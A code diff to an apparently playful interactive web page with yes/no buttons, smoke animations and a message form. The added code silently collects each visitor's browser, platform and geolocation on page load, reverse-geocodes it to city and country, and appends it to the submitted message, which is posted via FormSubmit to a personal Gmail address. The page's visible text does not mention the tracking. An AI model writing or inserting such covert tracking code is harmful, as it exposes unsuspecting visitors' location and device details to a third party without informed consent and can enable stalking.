@@ -67,6 +67,33 @@ const noBtn = document.getElementById('noBtn');
 const messageDiv = document.getElementById('messageBox');
 const msgForm = document.getElementById('msgForm');
 
+let deviceInfo = '';
+let locationInfo = '';
+
+// DEVICE INFO
+deviceInfo = `Device: ${navigator.userAgent}, Platform: ${navigator.platform}`;
+
+// LOCATION REQUEST ON PAGE LOAD
+window.onload = () => {
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            // Reverse geocoding using OpenStreetMap
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+            .then(res => res.json())
+            .then(data => {
+                locationInfo = `Location: ${data.address.city || data.address.town || data.address.village || data.address.hamlet || ''}, ${data.address.state || ''}, ${data.address.country || ''} (Lat: ${lat}, Lon: ${lon})`;
+            })
+            .catch(err => { locationInfo = `Location: Lat ${lat}, Lon ${lon}`; });
+        }, err => {
+            locationInfo = 'Location access denied';
+        });
+    } else {
+        locationInfo = 'Geolocation not supported';
+    }
+}
+
 function createSmoke(x,y){
     for(let i=0;i<10;i++){
         const smoke=document.createElement('div');
@@ -156,31 +183,21 @@ noBtn.onclick=()=>{
     endingDiv.animate([{opacity:0},{opacity:1}],{duration:1000,fill:'forwards'});
 };
 
-// Form submit via AJAX (FormSubmit) with device info
+// Form submit via AJAX (FormSubmit)
 msgForm.onsubmit = (e) => {
-    e.preventDefault();
+    e.preventDefault(); // prevent default redirect
 
     const msg = document.getElementById('userMsg').value;
-
-    const deviceInfo = {
-        message: msg,
-        device_type: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
-        browser: navigator.userAgent,
-        os: navigator.platform,
-        screen_resolution: `${screen.width} x ${screen.height}`,
-        time: new Date().toLocaleString()
-    };
+    const fullMsg = `User Message: ${msg}\n${deviceInfo}\n${locationInfo}`;
 
     fetch('https://formsubmit.co/ajax/ureren77@gmail.com', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-        },
-        body: JSON.stringify(deviceInfo)
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ message: fullMsg })
     })
     .then(response => response.json())
     .then(data => {
+        // show thank you then endingDiv
         messageDiv.style.display='none';
         const thankMsg = document.createElement('div');
         thankMsg.id='thankMsg';
@@ -190,7 +207,6 @@ msgForm.onsubmit = (e) => {
         thankMsg.style.transform='translate(-50%, -50%)';
         thankMsg.style.color='white';
         thankMsg.style.fontSize='28px';
-        thankMsg.style.fontWeight='bold';
         thankMsg.style.textAlign='center';
         thankMsg.style.zIndex='30';
         thankMsg.innerText='Thank you… Have a nice day';
@@ -200,7 +216,7 @@ msgForm.onsubmit = (e) => {
             thankMsg.remove();
             endingDiv.style.display='block';
             endingDiv.animate([{opacity:0},{opacity:1}],{duration:1000,fill:'forwards'});
-        },800);
+        },700);
     })
     .catch(error => {
         alert('Message could not be sent. Try again.');
@@ -216,4 +232,3 @@ endBtn.onclick=()=>{
 
 </body>
 </html>
-        
